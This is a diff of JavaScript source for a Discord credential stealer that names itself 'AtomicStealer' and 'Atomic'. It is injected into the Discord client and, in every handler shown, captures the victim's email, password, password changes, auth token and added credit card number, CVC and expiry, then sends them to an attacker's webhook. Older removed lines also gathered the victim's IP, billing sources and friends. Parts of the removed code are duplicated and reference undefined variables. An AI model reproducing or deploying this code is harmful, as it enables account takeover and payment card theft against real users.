@@ -1,3 +1,7 @@
+#beforeedit
+
+
+
 
 const fs = require('fs');
 const path = require('path');
@@ -71,7 +75,7 @@ function SendToWebhook(info) {
 
 function GetNitro(type) {
     if (type == 0) {
-        return "No"
+        return "No Nitro"
     }
     if (type == 1) {
         return "\`Nitro Classic\`"
@@ -79,7 +83,7 @@ function GetNitro(type) {
     if (type == 2) {
         return "\`Nitro Boost\`"
     } else {
-        return "No"
+        return "No Nitro"
     }
 }
 
@@ -139,135 +143,38 @@ function Login(email, password, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-                window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
-                    function totalFriends() {
-                        var f = JSON.parse(info4)
-                        const r = f.filter((user) => {
-                            return user.type == 1
-                        })
-                        return r.length
-                    }
-
-                    function CalcFriends() {
-                        var f = JSON.parse(info4)
-                        const r = f.filter((user) => {
-                            return user.type == 1
-                        })
-                        var gay = "";
-                        for (z of r) {
-                            var b = GetRBadges(z.user.public_flags)
-                            if (b != "") {
-                                gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-                            }
-                        }
-                        if (gay == "") {
-                            gay = "--"
-                        }
-                        return gay
-                    }
-
-                    function Cool() {
-                        const json = JSON.parse(info3)
-                        var billing = "";
-                        json.forEach(z => {
-                            if (z.type == "") {
-                                return "\`No\`"
-                            } else if (z.type == 2 && z.invalid != !0) {
-                                billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
-                            } else if (z.type == 1 && z.invalid != !0) {
-                                billing += "\`Yes\`" + " :credit_card:"
-                            } else {
-                                return "\`No\`"
-                            }
-                        })
-                        if (billing == "") {
-                            billing = "\`No\`"
-                        }
-                        return billing
-                    }
         const json = JSON.parse(info);
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
+            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": "Username :",
-                            "value":  json.username +"#" + json.discriminator ,
-                            "inline": false
-
+                            "name": "<a:party:709806688554975353> | Account Informations :",
+                            "value": `Email: \`${email}\` > Password: \`${password}\``,
+                            "inline": true
                         },
-
                         {
                             "name": ":unlock: | Token :",
                             "value": `\`${token}\``,
                             "inline": false
-                        },
-                        
-                        
-                        {
-                            "name": "<:8485discordemployee:940583845063979008> | Info :",
-                            "value": `Email: \`${email}\` \nPassword: \`${password}\``,
-                            "inline": false
-                        },
-
-
-                        {
-                            "name": "<a:discord_gif:709806861351911445> | Other :",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": false
-                        },
-
-
-                        {
-                            "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}```,
-                            "inline": false
                         }
                     ],
                     "author": {
-                        
+                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": "Atomic"
                     }
-                 }, {
-                        "title": `Total Friends (${totalFriends()})`,
-                        "description": CalcFriends(),
-                        "author": {
-                            "name": "AtomicStealer"
-                        },
-                        "footer": {
-                            "text": "AtomicStealer"
-                        },
-                        "thumbnail": {
-                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                        }
-                    }]
                 }
-                SendToWebhook(JSON.stringify(params))
-            })
-        })
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
     })
-})
 }
 
 function ChangePassword(oldpassword, newpassword, token) {
@@ -278,188 +185,46 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-            window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-            function Cool() {
-                const json = JSON.parse(info3)
-                var billing = "";
-                json.forEach(z => {
-                    if (z.type == "") {
-                        return "\`No\`"
-                    } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
-                    } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`Yes\`" + " :credit_card:"
-                    } else {
-                        return "\`No\`"
-                    }
-                })
-                if (billing == "") {
-                    billing = "\`No\`"
-                }
-                return billing
-            }
         const json = JSON.parse(info);
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
+            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": "<:8485discordemployee:940583845063979008> | Password Changed :",
+                            "name": "<a:blbutterfly:932017632322916362> | Password Changed :",
                             "value": `Email: \`${json.email}\`\nOld Password: \`${oldpassword}\`\nNew Password: \`${newpassword}\``,
                             "inline": false
                         },
-
-
-                        {
-                            "name": ":unlock: | Token :",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        },
-
-
                         {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                             "inline": true
                         },
-
-
                         {
-                            "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}```,
+                            "name": ":unlock: | Token :",
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                    }
-                }, {
-                    "title": `Total Friends (${totalFriends()})`,
-                    "description": CalcFriends(),
-                    "author": {
-                        "name": "AtomicStealer"
                     },
                     "footer": {
-                        "text": "AtomicStealer"
-                    },
-                    "thumbnail": {
-                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                    }
-                }]
-            }
-            SendToWebhook(JSON.stringify(params))
-        })
-    })
-})
-}
-
-function ChangePassword(oldpassword, newpassword, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-            window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-            function Cool() {
-                const json = JSON.parse(info3)
-                var billing = "";
-                json.forEach(z => {
-                    if (z.type == "") {
-                        return "\`No\`"
-                    } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
-                    } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`Yes\`" + " :credit_card:"
-                    } else {
-                        return "\`No\`"
-                    }
-                })
-                if (billing == "") {
-                    billing = "\`No\`"
+                        "text": "Atomic On Top"
+                    }                 
                 }
-                return billing
-            }
-        var json = JSON.parse(info);
-        var params = {
-            username: "Atomic",
-            content: "",
-            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
-            embeds: [
-                {
-                    "color": 000000,
-                    "fields": [
-                        {
-                            "name": "<:8485discordemployee:940583845063979008> | Email Changed :",
-                            "value": `New Email: \`${newemail}\`\nPassword: \`${password}\``,
-                            "inline": false
-                        },
-                        
-                        
-                        {
-                            "name": ":unlock: | Token :",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        },
-                        
-                        
-                        {
-                            "name": "<a:discord_gif:709806861351911445> | Other :",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": false
-                        },
-
-
-                        {
-                            "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}```,
-                            "inline": false
-                        }
-                    ],
-                    "author": {
-                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                    },
-                    "footer": {
-                        "text": "AtomicStealer"
-                    }
-                }]
-            }
-            SendToWebhook(JSON.stringify(params))
-        })
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
     })
-})
 }
 
-function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
+function ChangeEmail(newemail, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
@@ -467,45 +232,28 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
         var json = JSON.parse(info);
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
+            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": ":credit_card: | Credit Card Added",
-                            "value": `Credit Card Number: \`${number}\`\nCVC: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
-                            "inline": false
+                            "name": "<a:blbutterfly:932017632322916362> | Email Changed :",
+                            "value": `New Email: \`${newemail}\`\nPassword: \`${password}\``,
+                            "inline": true
                         },
-
-
-                        {
-                            "name": ":unlock: | Token :",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        },
-
-                        
                         {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": false
+                            "inline": true
                         },
-
-
                         {
-                            "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}```,
+                            "name": ":unlock: | Token :",
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
@@ -514,12 +262,59 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "AtomicStealer"
+                        "text": "Atomic On Top"
+                    }                
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
+}
+
+function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        var json = JSON.parse(info);
+        var params = {
+            username: "Atomic",
+            content: "@everyone",
+            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
+            embeds: [
+                {
+                    "color": 000000,
+                    "fields": [
+                        {
+                            "name": "<a:card:932017676610580551> | Credit Card Added",
+                            "value": `Credit Card Number: \`${number}\`\nCVC: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
+                            "inline": true
+                        },
+                        {
+                            "name": "<a:discord_gif:709806861351911445> | Other :",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
+                            "inline": true
+                        },
+                        {
+                            "name": ":unlock: | Token :",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": "Atomic On Top"
                     }
-                }]
-            }
-            SendToWebhook(JSON.stringify(params))
-        })
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
     })
 }
 
